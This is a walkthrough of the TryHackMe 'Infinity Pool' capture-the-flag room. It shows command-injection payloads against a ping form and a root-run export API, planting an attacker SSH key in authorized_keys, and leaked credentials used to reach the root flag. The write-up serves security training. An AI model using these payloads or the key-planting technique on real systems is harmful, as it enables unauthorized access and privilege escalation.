# Infinity Pool Wlakthrough
<br/>

## Intro
Welcome to the *Infinity Pool* challenge, here is the link to the [room](https://tryhackme.com/room/hh-infinitypool-5b3548af) on TryHackMe.

This is a medium level challenge about web exploitation to gain initial access, then some recon and privilege escalation to gain root.

"*Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.*"

Whenever you feel ready press on "start machine" and connect via OpenVPN or by using the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
For this challenge i decided to hand off the enumeration phase to my script called `EasyScan.sh`, you can find it on my Github [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Bash-Scripts/EasyScan.sh).

You will only need to provide the target IP and choose the report format like MarkDown.

```bash
wget https://raw.githubusercontent.com/Maat-Cyber/Maat-Cyber-World/refs/heads/main/Bash-Scripts/EasyScan.sh
chmod +x ./EasyScan.sh
./EasyScan.sh
```

We find 2 open ports:
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Byte Lotus &mdash; Stay Noticed
| http-robots.txt: 2 disallowed entries
|_/internal/ /status
| http-headers:
|   Server: gunicorn
|   Date: Fri, 07 Aug 2026 15:29:00 GMT
|   Connection: close
|   Content-Type: text/html; charset=utf-8
|   Content-Length: 1404
|
|_  (Request type: HEAD)
```

The quick directory scan also flags this:
```
http://10.81.128.35:80/robots.txt
http://10.81.128.35:80/status
```

Viewing in our browser the robots file`http://10.81.128.35/robots.txt` only shows the directories we have already uncovered:
```
User-agent: *
Disallow: /internal/
Disallow: /status
```

Time to move to `/status`, where we can provide an IP, a request to `http://10.81.128.35/internal/netcheck` will be sent and in background a `ping` command gets executed to check if the IP is up.
The request, captures with BurpSuite will look like this:
```http
POST /internal/netcheck HTTP/1.1
Host: 10.81.128.35
Content-Length: 24
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://10.81.128.35
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.81.128.35/internal/netcheck
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

host=127.0.0.1
```

My idea here is exploiting a command execution flaw, in the back-end the command would be something like:
```bash
ping [USER_PROVIDED_IP]
```

If we can break out of the ping commang, we might be able to execute others directly on the host.
The idea is to use bash operators like `;` or `&&` or `|` to close, concatenate or pipe to another command.

Testing it we instantly get a match at the second try with: `&&`:
```
127.0.0.1 && id
```

This in fact shows:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.029/0.029/0.029/0.000 ms
uid=1001(web) gid=1001(web) groups=1001(web)
```

This means we are the web user, we now can run commands directly in the target shell!

The next move is to supply a reverse shell or try to read ssh keys to have proper access to the system.

Since we have already found port 22 open, there is no point for a reverse shell, is way more unstable than a legit SSH connection.
So i have decided to generate new key pairs on my machine and upload my public key to the authorized_keys of the "web user".

<br/>

### Initial Access
The steps are:
1. Generate new key pairs:
```bash
ssh-keygen -t ed25519 -f  ssh_key -N ""
```

2. Open the `ssh_key.pub` and copy it in your keyboard.
3. Add it into the web user allowed keys with:
```
127.0.0.1 && echo "YOUR KEY HERE" > /home/web/.ssh/authorized_keys
```

4. Set right permission for the private key:
```bash
chmod 600 ssh_key
```

And now we can login via SSH with our key:
```bash
ssh web@10.81.128.35 -i ssh_key
```

Here we can now read the first flag in the use homedir:
```bash
cat user.txt
```
--> REDACTED

<br/>

### Privilege Escalation

#### Enumeration
With access to the system we now need to look for a way to escalate our privileges to root, since the last flag is  `/root/root.txt`.

We can use *Linpeas* to do the enumeration, fist we need to send it to the target:
```bash
scp -i ssh_key linpeas.sh  web@10.81.128.35:/home/web/linpeas.sh
```

Then make it executable, run it and save the output to a file, just in case we need that again later on:
```bash
chmod +x linpeas.sh
./linpeas.sh > linpeas-report
```


Give it about 30s to do the enumeration, then we read the report:
```bash
cat linpeas-report
```

Scrolling through the LinPEAS output, three internal services bound to `127.0.0.1` immediately catch my attention:
- **Port 9000 (Automation Service):** linpeas highlights a `gunicorn` Python web application running under the `cc-automation.service` systemd unit. The most critical detail here is that LinPEAS explicitly flags it with **`RUNS_AS_ROOT: Service runs as root`**. If we can find a way to interact with this service and exploit a command injection flaw, it would instantly grant us root privileges.

+ **Port 3000 (Watchtower API):** Another `gunicorn` application is running on localhost, this time tied to a `watchtower` directory (`/var/www/infinity_pool/watchtower/`). It appears to be an internal operations API. If it lacks proper authentication or leaks sensitive configuration data, it could be the key to unlocking the other internal services.

- **Port 8080 (FreePBX / Telephony Portal):** linpeas dumps a lot of info regarding `asterisk` processes and FreePBX files located in `/var/www/html/admin/`. Apache is hosting a VirtualHost on port 8080 pointing to this directory. This is likely the User Control Panel aka UCP or backend management interface for the hotel's telephony system.

All of them are worth further investigations, let's get going!

We can get the service:
```bash
cat /etc/systemd/system/cc-automation.service
```

Which shows
```
[Unit]
Description=Closed Circuit - Automation job runner (loopback, root)
After=network.target redis-server.service

[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
Restart=on-failure
RestartSec=2

[Install]
WantedBy=multi-user.target

```

The env file looks interesting but only root can read it unfortunately; the same goes for the directory.

What about port 3000, let's query this API:
```bash
curl http://localhost:3000/api/config
```

This one returns some JSON:
```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "REDACTED",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

This looks nice, we have an user name and a pass to use for the telephony_portal.

To access that we need our web browser, so we can forward port 8080 to our host and access it with our own browser, then input the credentials and login:
```bash
ssh -L 8080:127.0.0.1:8080 web@10.81.128.35 -i ssh_key
```

Then open the browser and go to `http://127.0.0.1:8080/ucp` and login.

There we find a blank page, we can fix it by pressing "+", on the top right, we create a new dashboard, then "+" on the left side to add widgets.
We find one called "Voidemail", viewing it we see "FreePbx", this is interesting since we found that in our enumeration and we had no access cause we were missing a key.

Adding that we see one message and this:
```
 2026 9:31 AM	"Automation Key REDACTED" <9000>
```

Very nice! the aautomation key used for what we have imagined before, port 9000.

Time to put it for good use, back into our target in SSH we can now connect:
```bash
curl -X POST http://127.0.0.1:9000/jobs/export \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <YOUR_NEW_TOKEN>" \
  -d '{"report":"amazing-report"}' \
  -s
```

The output is:
```json
{"command":"tar czf /var/automation/exports/amazing-report.tgz /var/automation/data 2>&1","output":"tar: Removing leading `/' from member names\n"}
```

In the back a command gets executed, and we can control part of it, since the "amazing-report" string we invented is present in the name.

<br>

#### Getting the Root Flag
That's funny, another command execution, we just need to break out of the main command to execute ours, then since it is run as root we could get the flag or a shell:
```bash
curl -X POST http://127.0.0.1:9000/jobs/export \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer REDACTED" \
  -d '{"report":"amazing; cat /root/root.txt; echo "}' \
  -s
```

And in the output we can see the flag:
```json
{"command":"tar czf /var/automation/exports/amazing; cat /root/root.txt; echo .tgz /var/automation/data 2>&1","output":"THM{REDACTED}\n.tgz /var/automation/data\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"}
```

--> REDACTED

<br/>
<br/>

Congratulations, you have successfully exploited multiplle command injection vulnerabilities, and found the hidden credentials to access the system service and read the root flag!


Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
